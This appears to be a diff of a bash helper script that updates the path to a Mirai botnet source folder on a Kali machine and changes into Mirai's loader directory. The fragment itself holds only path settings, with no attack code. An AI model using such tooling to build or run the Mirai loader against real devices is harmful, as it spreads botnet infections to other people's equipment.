@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # setting path to Mirai source Folder
-pathToMirai=/home/kali/Desktop/myMirai/MiraiSourceCode
+pathToMirai=/home/kali/Desktop/MiraiRepository/mirai/MiraiSourceCode
 export pathToMirai
 
 cd $pathToMirai/loader
